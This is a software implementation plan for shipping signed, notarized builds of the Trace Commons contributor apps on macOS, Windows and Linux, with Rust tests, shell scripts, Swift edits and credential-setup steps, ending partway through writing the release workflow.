# Signed App Distribution Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship signed, verifiable builds of the contributor apps on macOS, Windows, and Linux, installable on macOS via a Homebrew tap.

**Architecture:** A new tag-driven `release-apps.yml` runs three independent jobs — macOS (SwiftPM + `codesign` + `notarytool`), Windows (cargo + Azure Trusted Signing), Linux (flatpak-builder + GPG-signed OSTree repo on GCS) — feeding one GitHub Release. The existing `release-contributor.yml` gains signing for the CLI. A separate `TraceCommons/homebrew-tap` repository carries a cask for the notarized DMG and a formula for the signed CLI, each bumped by a pull request from its own workflow.

**Tech Stack:** GitHub Actions, SwiftPM, `codesign`/`notarytool`/`stapler`, `asc` (App Store Connect CLI), Azure Trusted Signing (`azure/trusted-signing-action`), `flatpak-builder` + OSTree + GnuPG, GCS + GCP Secret Manager, Homebrew cask/formula.

Spec: `docs/superpowers/specs/2026-08-16-signed-app-distribution-design.md`

## Global Constraints

- Branch: `signed-app-distribution-spec`, already created from `origin/main`.
- **Fail closed.** No code path may emit an unsigned artifact named like a release. `make-release-dmg.sh` already refuses when a credential is missing; every new path follows that rule.
- **Windows signatures MUST be RFC3161 timestamped.** Azure Trusted Signing certificates carry roughly three-day validity; the timestamp is the only reason a signature outlives them.
- **No new Rust dependencies.** Assertions about YAML/script files use plain string matching, not a YAML parser. (Repo policy: dependencies require explicit approval.)
- **`zap` must never delete `contributor.json`.** `~/Library/Application Support/trace-commons/contributor.json` holds the device identity key and `/v1/onboard` is not idempotent, so deleting it burns an unreissuable invite code.
- **Hardening standard, adopted from `sovright/argos`.** That repo already runs audited release signing against the *same* Azure account (`argossigning`/`argos`) and the same Apple team, so this plan converges on its practices rather than maintaining a second, softer pattern. Every workflow task is bound by all six rules:

  1. **Pin every action by commit SHA**, with the version in a trailing comment. Use argos's pins verbatim so both repos bump together:
     - `actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4`
     - `actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4`
     - `actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4`
     - `actions/attest-build-provenance@a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32 # v4`
     - `dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master@2026-05-27`
     - `azure/login@a457da9ea143d694b1b9c7c869ebb04ebe844ef5 # v2`
     - `softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2`
  2. **No build cache in any release job.** Not `actions/cache`, not `Swatinem/rust-cache`. A cache is a write-target a lower-privilege job can poison, and these jobs hold signing authority. Release builds pay the cold-build cost deliberately.
  3. **Non-secret Azure config comes from `vars.`, not `secrets.`**, scoped to the `release` environment: `AZURE_SIGNING_CLIENT_ID`, `AZURE_SIGNING_TENANT_ID`, `AZURE_SIGNING_SUBSCRIPTION_ID`, `AZURE_SIGNING_ENDPOINT`, `AZURE_SIGNING_ACCOUNT`, `AZURE_SIGNING_PROFILE`. Already provisioned (2026-08-16). Storing identifiers as secrets hides them from review for no benefit; keeping them as environment variables also lets a test profile be swapped in per environment.
  4. **Windows signing uses Microsoft's Trusted Signing dlib driven by `signtool`, not the marketplace action** — and the NuGet package is **verified by SHA-256 before extraction**, failing closed on mismatch, so a compromised CDN or MITM cannot execute attacker code inside a job that holds signing authority. Pinned version `1.0.95`, SHA-256 `3BFCF1E0A3CB42AF1692F0A8ED45C15DE070C2DE86F28A59B2795D904D8A920F` — independently verified on 2026-08-16 by downloading the package and hashing it, not copied on faith.
  5. **Every signed artifact gets `actions/attest-build-provenance`**, and the attestation step runs *after* signing so the SLSA provenance covers the signed bytes.
  6. **Any job holding signing authority declares `environment: release`.** This is also load-bearing for auth, not just policy: the federated credential's subject is `repo:TraceCommons/trace-commons-server:environment:release`, so a job without it fails OIDC.

- Remaining `ci.yml` conventions still apply where the above is silent: `dtolnay/rust-toolchain` for Rust setup and an explicit `timeout-minutes` on every job.
- Existing verbatim values to reuse, not re-derive:
  - Bundle id: `ai.tracecommons.shell`
  - Flatpak app id: `ai.tracecommons.Contributor`
  - Azure Trusted Signing: account `argossigning`, resource group `argos-signing`, profile `argos`, endpoint `https://eus.codesigning.azure.net/`
  - Azure subscription `cd8568f1-be90-45d3-8bdf-65b2c3f09ad2`, tenant `48d94944-6c6f-4b98-b307-f06351bef9d5`
  - GCP project `tracecommons-pilot-2026`
  - Apple: `asc` profile `iqlusion`; orphaned cert `3K939H4WUQ` (`DEVELOPER_ID_APPLICATION_G2`) — do not revoke until Task 5 passes.
- Every claim of success needs pasted command output. A script that has never run is not evidence.

## File Structure

**Created:**
- `macos/scripts/info-plist.sh` — prints the Info.plist for a given version/build. Sole owner of bundle metadata; extracted so it can be tested without a Swift toolchain.
- `crates/trace-commons-contributor/tests/release_pipeline.rs` — pins the release path's invariants (env contracts, timestamping, zap exclusion). Follows the `crates/trace-commons-contributor-ffi/tests/header.rs` pattern: reads repo files via `CARGO_MANIFEST_DIR`, skips rather than fails when a tool is absent.
- `.github/workflows/release-apps.yml` — the three-platform release.
- `crates/trace-commons-contributor-gtk/flatpak/cargo-sources.json` — generated, committed.
- `scripts/flatpak/build-and-sign.sh` — flatpak build, GPG sign, repo update.
- `scripts/flatpak/publish-repo.sh` — sync OSTree repo + `.flatpakref` to GCS.
- `docs/release-runbook.md` — the manual gates and credential rotation.
- In `TraceCommons/homebrew-tap`: `Casks/trace-commons.rb`, `Formula/trace-commons-contributor.rb`.

**Modified:**
- `macos/Package.swift` — library search path from the environment instead of hardcoded `../target/debug`.
- `macos/scripts/make-app-bundle.sh` — version injection, calls `info-plist.sh`, exports `TC_FFI_LIB_DIR`, ad-hoc signature confined to the dev path.
- `macos/scripts/make-release-dmg.sh` — notarize via ASC API key; drop the Apple ID + app-specific password.
- `.github/workflows/release-contributor.yml` — sign and notarize the CLI; rewrite the release notes.

---

### Task 1: Make the bundle version injectable

The Info.plist is a heredoc inside `make-app-bundle.sh` with `CFBundleShortVersionString` hardcoded to `0.1.0`. Extract it so a version can be passed in and asserted on without a Swift toolchain.

**Files:**
- Create: `macos/scripts/info-plist.sh`
- Modify: `macos/scripts/make-app-bundle.sh:28-56` (the heredoc and the `CONFIG` handling above it)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: nothing.
- Produces: `macos/scripts/info-plist.sh <short_version> <build_version>` prints a complete Info.plist to stdout. `make-app-bundle.sh [config] [short_version] [build_version]` — config defaults to `debug`, short version to `0.0.0-dev`, build to `1`.

- [ ] **Step 1: Write the failing test**

Create `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
//! Pins the invariants of the release path. These files are shell scripts and
//! workflow YAML, so the assertions are deliberately textual: a YAML parser
//! would mean a new dependency, and the properties worth pinning here (an env
//! contract, a mandatory flag, an exclusion) are visible in the text.
//!
//! What this file CANNOT prove: that signing, notarization, or a flatpak build
//! actually work. Only a real run against real credentials shows that. See
//! `docs/release-runbook.md` for those gates.

use std::path::PathBuf;
use std::process::Command;

fn repo_root() -> PathBuf {
    PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/../.."))
}

fn read(relative: &str) -> String {
    let path = repo_root().join(relative);
    std::fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("reading {}: {e}", path.display()))
}

#[test]
fn info_plist_script_injects_the_version_it_is_given() {
    let script = repo_root().join("macos/scripts/info-plist.sh");
    let output = Command::new("bash")
        .arg(&script)
        .args(["0.4.2", "17"])
        .output()
        .expect("failed to run info-plist.sh");
    assert!(
        output.status.success(),
        "info-plist.sh failed: {}",
        String::from_utf8_lossy(&output.stderr),
    );
    let plist = String::from_utf8_lossy(&output.stdout);

    assert!(
        plist.contains("<key>CFBundleShortVersionString</key><string>0.4.2</string>"),
        "the short version was not injected:\n{plist}"
    );
    assert!(
        plist.contains("<key>CFBundleVersion</key><string>17</string>"),
        "the build version was not injected:\n{plist}"
    );
    // A release must never ship the placeholder the old heredoc hardcoded.
    assert!(
        !plist.contains("0.1.0"),
        "the hardcoded 0.1.0 is still present:\n{plist}"
    );
    // Regressions here are silent and severe: without LSUIElement the menu-bar
    // app grows a Dock icon, and without the bundle id notifications break.
    assert!(plist.contains("<key>LSUIElement</key><true/>"), "LSUIElement lost");
    assert!(
        plist.contains("<key>CFBundleIdentifier</key><string>ai.tracecommons.shell</string>"),
        "bundle id lost"
    );
}

#[test]
fn bundle_script_passes_its_version_through_to_the_plist() {
    let script = read("macos/scripts/make-app-bundle.sh");
    assert!(
        script.contains("info-plist.sh"),
        "make-app-bundle.sh must delegate to info-plist.sh rather than \
         carrying its own heredoc, or the two will drift"
    );
    assert!(
        !script.contains("CFBundleShortVersionString"),
        "the plist heredoc is still inline in make-app-bundle.sh"
    );
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL — `info-plist.sh` does not exist, so the first test panics running it, and the second fails because the heredoc is still inline.

- [ ] **Step 3: Create `macos/scripts/info-plist.sh`**

```bash
#!/usr/bin/env bash
# Print the Info.plist for TraceCommons.app.
#
# Extracted from make-app-bundle.sh so the version can be injected from a
# release tag and asserted in a test without a Swift toolchain. The old
# heredoc hardcoded CFBundleShortVersionString to 0.1.0, which meant any
# tagged release would have shipped a DMG claiming 0.1.0 -- and Homebrew
# compares a cask's declared version against what is installed, so that also
# broke `brew upgrade`.
set -euo pipefail

SHORT_VERSION="${1:?usage: info-plist.sh <short_version> <build_version>}"
BUILD_VERSION="${2:?usage: info-plist.sh <short_version> <build_version>}"

cat <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key><string>Trace Commons</string>
    <key>CFBundleDisplayName</key><string>Trace Commons</string>
    <key>CFBundleIdentifier</key><string>ai.tracecommons.shell</string>
    <key>CFBundleExecutable</key><string>TraceCommonsApp</string>
    <key>CFBundlePackageType</key><string>APPL</string>
    <key>CFBundleShortVersionString</key><string>${SHORT_VERSION}</string>
    <key>CFBundleVersion</key><string>${BUILD_VERSION}</string>
    <key>LSMinimumSystemVersion</key><string>14.0</string>
    <key>NSHumanReadableCopyright</key><string>Trace Commons</string>
    <!-- Menu-bar item, no Dock icon: the shape macOS users expect from a
         background utility. -->
    <key>LSUIElement</key><true/>
</dict>
</plist>
PLIST
```

- [ ] **Step 4: Make it executable**

Run: `chmod +x macos/scripts/info-plist.sh`

- [ ] **Step 5: Replace the heredoc in `make-app-bundle.sh`**

Change the argument handling near the top from:

```bash
CONFIG="${1:-debug}"
```

to:

```bash
CONFIG="${1:-debug}"
# A dev bundle gets an obviously-not-a-release version. The release path
# passes the tag's version explicitly; see release-apps.yml.
SHORT_VERSION="${2:-0.0.0-dev}"
BUILD_VERSION="${3:-1}"
```

Then replace the entire `cat > "$APP/Contents/Info.plist" <<'PLIST' ... PLIST` block with:

```bash
./scripts/info-plist.sh "$SHORT_VERSION" "$BUILD_VERSION" \
  > "$APP/Contents/Info.plist"
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: PASS, 2 tests.

- [ ] **Step 7: Commit**

```bash
git add macos/scripts/info-plist.sh macos/scripts/make-app-bundle.sh \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Inject the bundle version instead of hardcoding 0.1.0"
```

---

### Task 2: Link the release bundle against the release dylib

`Package.swift` hardcodes `-L ../target/debug` in both executable targets' `linkerSettings`, while `make-release-dmg.sh` builds `release`. On a clean CI checkout that builds only the release dylib there is no `target/debug`, so the Swift link step fails outright. Also confine the ad-hoc signature to the development path, so the release path stops re-signing over a signature it does not want.

**Files:**
- Modify: `macos/Package.swift` (both `linkerSettings` blocks)
- Modify: `macos/scripts/make-app-bundle.sh` (export the search path; guard the ad-hoc `codesign`)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: `make-app-bundle.sh [config] [short_version] [build_version]` from Task 1.
- Produces: `make-app-bundle.sh` exports `TC_FFI_LIB_DIR=<repo>/target/<config>` before `swift build`, and skips the ad-hoc `codesign` when `TC_SKIP_ADHOC_SIGN=1`.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn swift_manifest_takes_the_library_path_from_the_environment() {
    let manifest = read("macos/Package.swift");
    assert!(
        manifest.contains("TC_FFI_LIB_DIR"),
        "Package.swift must read the FFI library search path from \
         TC_FFI_LIB_DIR. Hardcoding ../target/debug makes a release build \
         link against a directory that does not exist in CI."
    );
    // The env var is read once and reused; a literal debug path left in a
    // linkerSettings block would silently win for that target.
    let hardcoded_in_linker_settings = manifest
        .split("linkerSettings")
        .skip(1)
        .any(|section| section.contains("../target/debug"));
    assert!(
        !hardcoded_in_linker_settings,
        "a linkerSettings block still hardcodes ../target/debug"
    );
}

#[test]
fn bundle_script_exports_the_library_path_and_can_skip_adhoc_signing() {
    let script = read("macos/scripts/make-app-bundle.sh");
    assert!(
        script.contains("TC_FFI_LIB_DIR"),
        "make-app-bundle.sh must export TC_FFI_LIB_DIR so swift build links \
         against target/$CONFIG"
    );
    assert!(
        script.contains("TC_SKIP_ADHOC_SIGN"),
        "the release path must be able to skip the ad-hoc signature rather \
         than have make-release-dmg.sh re-sign over it"
    );
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL on both new tests — `TC_FFI_LIB_DIR` appears nowhere.

- [ ] **Step 3: Read the path from the environment in `Package.swift`**

Add above `let package = Package(`:

```swift
import Foundation

// Which cargo profile's dylib to link against. make-app-bundle.sh exports
// this as <repo>/target/<config>; the default keeps a bare `swift build`
// working for development, which is the only reason the debug path is
// mentioned at all. It used to be hardcoded in both linkerSettings blocks,
// which meant `swift build -c release` linked against target/debug -- and
// failed outright on a CI checkout that never built debug.
let ffiLibDir = ProcessInfo.processInfo.environment["TC_FFI_LIB_DIR"]
    ?? "../target/debug"
```

Then in **both** executable targets replace:

```swift
            linkerSettings: [
                .unsafeFlags([
                    "-L", "../target/debug",
                    "-ltrace_commons_contributor_ffi",
                ])
            ]
```

with:

```swift
            linkerSettings: [
                .unsafeFlags([
                    "-L", ffiLibDir,
                    "-ltrace_commons_contributor_ffi",
                ])
            ]
```

- [ ] **Step 4: Export the path and guard the ad-hoc signature in `make-app-bundle.sh`**

Immediately before the `swift build` line, add:

```bash
# Package.swift reads this; without it a release build links target/debug.
export TC_FFI_LIB_DIR="$REPO_ROOT/target/$CONFIG"
```

Replace the two trailing `codesign` lines with:

```bash
# An ad-hoc signature is what makes a DEVELOPMENT bundle launchable. The
# release path signs with a Developer ID immediately afterwards, so doing it
# here first is wasted work that also makes the release path read as if it
# might ship an ad-hoc signature.
if [ "${TC_SKIP_ADHOC_SIGN:-0}" != "1" ]; then
  codesign --force --sign - --timestamp=none "$APP/Contents/Frameworks/$DYLIB_NAME" >/dev/null 2>&1 || true
  codesign --force --sign - --timestamp=none "$APP" >/dev/null 2>&1 || true
fi
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: PASS, 4 tests.

- [ ] **Step 6: Prove the release build actually links (macOS only)**

The tests above pin the contract; only a real build proves the fix. On macOS:

```bash
rm -rf target/debug/libtrace_commons_contributor_ffi.dylib macos/.build
cargo build --release -p trace-commons-contributor-ffi
./macos/scripts/make-app-bundle.sh release 0.4.2 17
/usr/libexec/PlistBuddy -c 'Print :CFBundleShortVersionString' \
  macos/.build/TraceCommons.app/Contents/Info.plist
```

Expected: the bundle builds with **no** `target/debug` present, and PlistBuddy prints `0.4.2`. Paste both outputs into the task report. If `swift` is unavailable, say so rather than claiming the step passed.

- [ ] **Step 7: Commit**

```bash
git add macos/Package.swift macos/scripts/make-app-bundle.sh \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Link the release bundle against the release dylib"
```

---

### Task 3: Mint a Developer ID identity we hold the key for

App Store Connect lists `3K939H4WUQ` (`DEVELOPER_ID_APPLICATION_G2`, Iqlusion Inc, valid to 2031), but `security find-identity -v -p codesigning` shows only Apple Development and iPhone Distribution identities — the private key is not on this machine. Mint a pair we control.

This task is credential operations, not code. It has no unit test; its verification is a real signature.

**Files:** none in-repo. Produces GitHub Actions secrets.

**Interfaces:**
- Produces, as repository secrets on `TraceCommons/trace-commons-server`: `MACOS_CERTIFICATE_P12_BASE64`, `MACOS_CERTIFICATE_PASSWORD`, `MACOS_SIGNING_IDENTITY`, `MACOS_NOTARY_ASC_KEY_P8_BASE64`, `MACOS_NOTARY_ASC_KEY_ID`, `MACOS_NOTARY_ASC_ISSUER_ID`.

- [ ] **Step 1: Confirm the gap rather than assuming it**

```bash
security find-identity -v -p codesigning
asc certificates list --output table
```

Expected: no `Developer ID Application` line in the first output; `3K939H4WUQ` present in the second. If a Developer ID identity *does* appear locally, stop and report — the key exists and this task becomes "export it" instead.

- [ ] **Step 2: Mint the certificate and keep the key**

```bash
mkdir -p /tmp/tc-signing && cd /tmp/tc-signing
asc certificates create \
  --certificate-type DEVELOPER_ID_APPLICATION_G2 \
  --generate-csr \
  --key-out ./devid.key \
  --csr-out ./devid.csr \
  --common-name "Iqlusion Inc" \
  --organization "Iqlusion Inc" \
  --output json --pretty
```

Save the returned certificate content to `devid.cer`. Do **not** revoke `3K939H4WUQ` yet — if this certificate turns out to be unusable, revoking first leaves no working identity.

- [ ] **Step 3: Build a `.p12` and import it locally**

```bash
cd /tmp/tc-signing
openssl x509 -inform DER -in devid.cer -out devid.pem 2>/dev/null \
  || cp devid.cer devid.pem
P12_PASSWORD="$(uuidgen)"
openssl pkcs12 -export -legacy \
  -inkey devid.key -in devid.pem \
  -name "Developer ID Application" \
  -passout "pass:$P12_PASSWORD" -out devid.p12
echo "p12 password: $P12_PASSWORD"
security import devid.p12 -k ~/Library/Keychains/login.keychain-db \
  -P "$P12_PASSWORD" -T /usr/bin/codesign
security find-identity -v -p codesigning
```

Expected: `security find-identity` now lists `Developer ID Application: Iqlusion Inc (TEAMID)`. Record that string verbatim — it becomes `MACOS_SIGNING_IDENTITY`.

- [ ] **Step 4: Prove the identity can actually sign**

```bash
cd /tmp/tc-signing
printf 'int main(void){return 0;}' > probe.c && cc -o probe probe.c
codesign --force --timestamp --options runtime \
  --sign "Developer ID Application: Iqlusion Inc (TEAMID)" probe
codesign --verify --strict --verbose=2 probe
```

Expected: `probe: valid on disk` and `satisfies its Designated Requirement`. Paste the output. A certificate that lists in ASC but cannot sign is the exact failure this step exists to catch.

- [ ] **Step 5: Load the secrets**

The ASC API key `.p8` is the one already registered with the `iqlusion` profile; if the file is not on disk, generate a fresh App Store Connect API key (Admin or App Manager role) at the Integrations page and use that. `notarytool` needs the `.p8`, its key id, and the issuer id.

```bash
cd /tmp/tc-signing
gh secret set MACOS_CERTIFICATE_P12_BASE64 --repo TraceCommons/trace-commons-server \
  --body "$(base64 -i devid.p12)"
gh secret set MACOS_CERTIFICATE_PASSWORD --repo TraceCommons/trace-commons-server \
  --body "$P12_PASSWORD"
gh secret set MACOS_SIGNING_IDENTITY --repo TraceCommons/trace-commons-server \
  --body "Developer ID Application: Iqlusion Inc (TEAMID)"
gh secret set MACOS_NOTARY_ASC_KEY_P8_BASE64 --repo TraceCommons/trace-commons-server \
  --body "$(base64 -i AuthKey_XXXXXXXX.p8)"
gh secret set MACOS_NOTARY_ASC_KEY_ID --repo TraceCommons/trace-commons-server --body "XXXXXXXX"
gh secret set MACOS_NOTARY_ASC_ISSUER_ID --repo TraceCommons/trace-commons-server \
  --body "<issuer uuid>"
gh secret list --repo TraceCommons/trace-commons-server
```

- [ ] **Step 6: Destroy the scratch copies**

```bash
rm -rf /tmp/tc-signing
```

The key now exists in exactly two places: this machine's login keychain and the repository secret. Record in the task report that `3K939H4WUQ` is still live and pending revocation after Task 6.

---

### Task 4: Notarize with an App Store Connect API key

`make-release-dmg.sh` requires `MACOS_NOTARY_APPLE_ID` and `MACOS_NOTARY_PASSWORD` and runs `notarytool store-credentials`, whose own header documents the residual exposure: the password sits in that process's argv, readable via `ps`. `notarytool` accepts an ASC API key directly, which removes two secrets and the exposure window.

**Files:**
- Modify: `macos/scripts/make-release-dmg.sh` (header, `require_env` list, `cleanup`, the notarize step)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: the secrets from Task 3; `TC_SKIP_ADHOC_SIGN` from Task 2.
- Produces: `make-release-dmg.sh` requires `MACOS_CERTIFICATE_P12_BASE64`, `MACOS_CERTIFICATE_PASSWORD`, `MACOS_SIGNING_IDENTITY`, `MACOS_NOTARY_ASC_KEY_P8_BASE64`, `MACOS_NOTARY_ASC_KEY_ID`, `MACOS_NOTARY_ASC_ISSUER_ID`, and takes optional `$1`/`$2` as short and build version.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn release_dmg_notarizes_with_an_api_key_not_a_password() {
    let script = read("macos/scripts/make-release-dmg.sh");

    // Assert against CODE, not comments. Matching the whole file would police
    // prose: the negative checks below would forbid the header from ever
    // naming the old tool, costing a reader the ability to grep this file for
    // why the key path exists -- and the positive checks would be satisfied by
    // a header that documents a variable the script never actually passes.
    let code = script
        .lines()
        .filter(|line| !line.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n");

    for required in [
        "MACOS_NOTARY_ASC_KEY_P8_BASE64",
        "MACOS_NOTARY_ASC_KEY_ID",
        "MACOS_NOTARY_ASC_ISSUER_ID",
    ] {
        assert!(
            code.contains(required),
            "make-release-dmg.sh must actually use {required}, not merely \
             mention it in a comment"
        );
    }

    // An app-specific password in argv is visible to any local process for the
    // duration of the call. The API key is passed as a file path instead.
    // Anchored with the `$` sigil so a future MACOS_NOTARY_PASSWORD_FILE, or
    // prose in the header explaining the history, does not trip these.
    for gone in ["$MACOS_NOTARY_APPLE_ID", "$MACOS_NOTARY_PASSWORD\"", "store-credentials"] {
        assert!(
            !code.contains(gone),
            "{gone} is still used; the Apple ID + app-specific password path \
             was replaced by the ASC API key, and store-credentials was the \
             source of the ps-visible password window"
        );
    }
    assert!(
        code.contains("--options runtime"),
        "hardened runtime is required for notarization"
    );
    assert!(
        code.contains("stapler staple"),
        "an unstapled DMG fails for a user who is offline"
    );
    // The release path must not silently default its version: a DMG stamped
    // 0.0.0-dev would pass every signing and Gatekeeper gate and then confuse
    // every version comparison downstream.
    assert!(
        code.contains("${1:?") && code.contains("${2:?"),
        "make-release-dmg.sh must REFUSE without an explicit version and build \
         number rather than defaulting"
    );
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL — the ASC key vars are absent and `MACOS_NOTARY_APPLE_ID` is present.

- [ ] **Step 3: Update the credential list and header**

In the header's `# # Credentials` block, replace the three notary lines with:

```
#   MACOS_NOTARY_ASC_KEY_P8_BASE64  App Store Connect API key (.p8), base64
#   MACOS_NOTARY_ASC_KEY_ID         that key's id
#   MACOS_NOTARY_ASC_ISSUER_ID      the issuer id for the team
#
# notarytool takes an API key rather than an Apple ID and app-specific
# password. This removes two secrets, and closes the window where
# `notarytool store-credentials` held the password in this process's argv
# where any local process could read it from `ps`.
```

Replace the `for var in ...` loop with:

```bash
for var in MACOS_CERTIFICATE_P12_BASE64 MACOS_CERTIFICATE_PASSWORD \
           MACOS_SIGNING_IDENTITY MACOS_NOTARY_ASC_KEY_P8_BASE64 \
           MACOS_NOTARY_ASC_KEY_ID MACOS_NOTARY_ASC_ISSUER_ID; do
  require_env "$var"
done
```

- [ ] **Step 4: Pass the version through and skip the ad-hoc signature**

Replace `CONFIG=release` and the bundle build call. Add near the top — note these are **required**, not defaulted:

```bash
SHORT_VERSION="${1:?refusing to build a release without a version. Pass the
tag's version explicitly; see release-apps.yml.}"
BUILD_VERSION="${2:?refusing to build a release without a build number.}"
```

No default here, deliberately. This script's header promises "There are no defaults, and the script refuses rather than falling back," and a silent `0.0.0-dev` would defeat that in the worst way: if a later edit to `release-apps.yml` drops or mistypes the positional arguments, the script would sign, notarize, staple and Gatekeeper-verify a DMG stamped `0.0.0-dev`. Every gate would pass and the artifact would publish — and Homebrew's version comparison would then treat the shipped release as older than everything. The dev-friendly default belongs in `make-app-bundle.sh`, where it already lives.

and change the build line to:

```bash
TC_SKIP_ADHOC_SIGN=1 ./scripts/make-app-bundle.sh \
  "$CONFIG" "$SHORT_VERSION" "$BUILD_VERSION"
```

- [ ] **Step 5: Replace the notarization step**

Delete the `NOTARY_PROFILE=tc-notary` line. In `cleanup()`, replace the two `notarytool`/`delete-generic-password` lines with:

```bash
  rm -f "$WORK/notary.p8"
```

Write the key to the scratch directory alongside the certificate import, then replace the whole `store-credentials` + `submit` block with:

```bash
echo "--- notarizing (this waits for Apple's verdict)"
# The key is written to the private scratch dir and passed by path, so unlike
# an app-specific password it never appears in this call's argv.
#
# That does NOT mean argv exposure is solved for this script: `security import
# -P "$MACOS_CERTIFICATE_PASSWORD"` above still passes a secret as an argument,
# and neither tool accepts one on stdin. So the standing rules still hold, and
# one of them now matters MORE than before: never enable shell tracing
# (`set -x`) in this script -- with tracing on, the line below would trace the
# entire base64 private key. Run release builds on an isolated ephemeral
# runner.
#
# Three defences, all needed, none sufficient alone:
#
#   rm -f    -- `umask` applies only at file CREATION. A redirect onto an
#               EXISTING file truncates it and keeps its old mode, so a
#               notary.p8 left behind by a cancelled run would receive the key
#               at whatever mode it already had. That is reachable: the EXIT
#               trap does not fire on SIGKILL or job cancellation, and
#               RUNNER_TEMP persists across steps -- across jobs on a
#               self-hosted runner. It also stops `>` silently following a
#               pre-existing symlink at that path.
#   umask    -- closes the window between creation and chmod, since `>` would
#               otherwise create at 0666 & ~umask (0644 by default) and
#               RUNNER_TEMP is not reliably private.
#   chmod    -- belt and braces, and the thing a reader greps for.
rm -f "$WORK/notary.p8"
( umask 077; echo "$MACOS_NOTARY_ASC_KEY_P8_BASE64" | base64 --decode > "$WORK/notary.p8" )
chmod 600 "$WORK/notary.p8"
xcrun notarytool submit "$DMG" \
  --key "$WORK/notary.p8" \
  --key-id "$MACOS_NOTARY_ASC_KEY_ID" \
  --issuer "$MACOS_NOTARY_ASC_ISSUER_ID" \
  --wait
```

- [ ] **Step 6: Update the `# # Status` block**

Replace it with:

```
# # Status
#
# STILL NEVER EXECUTED as of this change. This commit alters which credentials
# the script demands; it does not run it. No Developer ID key was available
# when it landed, so nothing here has signed or notarized anything, and a
# script that has never run is not evidence.
#
# What would change that, in order: a real run producing a signed, notarized,
# stapled DMG, and then the clean-machine gate -- open that DMG on a Mac that
# did not build it, with the network off, and confirm it launches with no
# Gatekeeper prompt. Only versions that have passed BOTH may be described as
# verified.
```

Do **not** write "the credential path has been exercised" or reference `docs/release-runbook.md` here. An earlier draft of this plan prescribed exactly that, and it was wrong on both counts: the runbook does not exist until Task 5, and no credential existed when this task ran. Replacing a true "never executed" with a false claim of verification is the precise failure this project's rules exist to prevent — a release engineer who reads it skips the exploratory dry run and meets first-run failures (wrong issuer id, a key lacking the Developer role) during a tagged release instead. Task 5 step 9 updates this block once a run has actually happened.

- [ ] **Step 7: Run the tests and shellcheck**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: PASS, 5 tests.

Run: `shellcheck macos/scripts/make-release-dmg.sh macos/scripts/make-app-bundle.sh macos/scripts/info-plist.sh`
Expected: clean, or only the already-suppressed `SC2086` directives. If `shellcheck` is not installed, say so rather than claiming it passed.

- [ ] **Step 8: Commit**

```bash
git add macos/scripts/make-release-dmg.sh \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Notarize with an App Store Connect API key"
```

---

### Task 5: The macOS release job, and a real signed DMG

**Files:**
- Create: `.github/workflows/release-apps.yml`
- Create: `docs/release-runbook.md`
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: `make-release-dmg.sh <short_version> <build_version>` (Task 4); the Task 3 secrets.
- Produces: a workflow on tag `app-v*` and `workflow_dispatch` with a `platform` input (`all`/`macos`/`windows`/`linux`), a `version` job exposing `outputs.short` and `outputs.build`, and a `macos` job uploading artifact `macos-dmg`.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn release_apps_workflow_is_tag_driven_and_per_platform_runnable() {
    let workflow = read(".github/workflows/release-apps.yml");
    assert!(workflow.contains("app-v*"), "must trigger on app-v* tags");
    assert!(
        workflow.contains("workflow_dispatch"),
        "one platform must be re-runnable without cutting a tag"
    );
    // Independent jobs, not matrix legs: the packaging steps share nothing,
    // and one platform failing must not block the others.
    for job in ["  macos:", "  windows:", "  linux-flatpak:"] {
        assert!(workflow.contains(job), "missing job {job}");
    }
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL — the workflow file does not exist, so `read` panics.

- [ ] **Step 3: Create `.github/workflows/release-apps.yml` with the version and macOS jobs**

```yaml
# Signed releases of the contributor apps. Tag-driven: push a tag like
# `app-v0.2.0`.
#
# Three independent jobs rather than a matrix. The packaging steps share
# essentially nothing -- SwiftPM plus notarytool, cargo plus Azure Trusted
